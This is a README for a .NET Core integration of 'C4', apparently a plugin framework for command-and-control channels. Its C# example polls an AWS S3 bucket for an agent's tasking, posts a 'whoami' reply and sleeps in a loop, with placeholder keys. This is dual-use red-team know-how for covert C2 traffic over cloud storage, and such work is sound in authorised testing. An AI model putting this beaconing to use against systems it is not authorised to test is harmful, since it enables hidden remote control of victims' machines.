# .NET Core

**WARNING!** Only .NET Core is supported. The required Extism nuget package is not supported by .NET Framework.

For team servers and/or agents written in .NET Core, a simplistic example is included that can be used as a rough template.

## Usage

1. Install the Extism dependencies
```
dotnet add package Extism.runtime.all
dotnet add package Extism.Sdk
```

2. To compile the C4 plugin directly into the C2 framework or agent, add the .wasm file in the `Resources/` folder.

3. Compile and run!
```
dotnet build software.csproj
.\bin\Debug\netX.X\software.exe
```

More thorough documentation can be found at <https://github.com/extism/dotnet-sdk>

Below is an example of using a C4 plugin in .NET Core. See the full example at: <https://github.com/scottctaylor12/C4/examples/net-core>

## Example

```csharp
using System;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;

using Extism.Sdk;

class Program
{
    public class C4Output
    {
        [JsonPropertyName("success")]
        public bool Success { get; set; }
        [JsonPropertyName("status")]
        public string Status { get; set; } = string.Empty;
        [JsonPropertyName("messages")]
        public string[] Messages { get; set; } = Array.Empty<string>();
    }
    static void Main()
    {

        /*
		    Example usage of the AWS S3 C4 plugin.
		    Implementation details will vary based on your C2 and/or agent
	    */

        // load the C4 plugin
        Plugin plugin = Initialize();
        
        while (true)
        {
            // The current agent ID is "12345"
            // Receive messages from AWS S3 bucket for the agent with ID "12345"
            try
            {
                string recMsg = "{\"action\":\"receive\",\"params\":{\"agent_id\":\"12345\",\"access_key\":\"AKIAXXXXXXXXXXXX\",\"secret_key\":\"SECRET\",\"region\":\"REGION\",\"bucket\":\"BUCKET-NAME\"}}";
                var result = plugin.Call("c4", Encoding.UTF8.GetBytes(recMsg));

                string output = Encoding.UTF8.GetString(result);
                var c4Output = JsonSerializer.Deserialize<C4Output>(output);

                // While debugging check the status of your request
                // Console.WriteLine($"Status: {c4Output.Status}");

                if (c4Output.Success && c4Output.Messages.Length > 0)
                {
                    foreach (var message in c4Output.Messages)
                    {
                        // Process each message as needed
                        Console.WriteLine($"Processing message: {message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                Console.WriteLine($"Stack trace: {ex.StackTrace}");
            }


            // Let's pretend we received a "whoami" message
            // Send a response back to the S3 bucket with the "server" as the recipient
            try
            {
                string message = "scottctaylor12"; // realistically, the message is probably a format specific to your C2
                string sendMsg = $"{{\"action\":\"send\",\"params\":{{\"agent_id\":\"server\",\"message\":\"{message}\",\"access_key\":\"AKIAXXXXXXXXXXXX\",\"secret_key\":\"SECRET\",\"region\":\"REGION\",\"bucket\":\"BUCKET-NAME\"}}}}";

                var sendResult = plugin.Call("c4", Encoding.UTF8.GetBytes(sendMsg));

                string sendOutput = Encoding.UTF8.GetString(sendResult);

                var sendC4Output = JsonSerializer.Deserialize<C4Output>(sendOutput);
                if (sendC4Output.Success)
                {
                    Console.WriteLine(sendC4Output.Status);
                }
                else
                {
                    Console.WriteLine($"Failed to send message: {sendC4Output.Status}");
                }
            }
            catch (System.Exception)
            {

                throw;
            }

            Thread.Sleep(5000);
        }
    }
    public static Plugin Initialize()
    {
        var assembly = Assembly.GetExecutingAssembly();

        var resourceName = "net_core.Resources.c4.wasm";

        using var stream = assembly.GetManifestResourceStream(resourceName);
        if (stream == null)
        {
            Console.WriteLine("Could not find embedded Wasm resource.");
            return null;
        }

        using var ms = new MemoryStream();
        stream.CopyTo(ms);
        var wasmBytes = ms.ToArray();

        var source = new ByteArrayWasmSource(wasmBytes, "c4");
        var manifest = new Manifest(new[] { source })
        {
            AllowedHosts = new[] { "*" },
        };

        var plugin = new Plugin(manifest, new HostFunction[] { }, withWasi: true);
        return plugin;
    }
}
```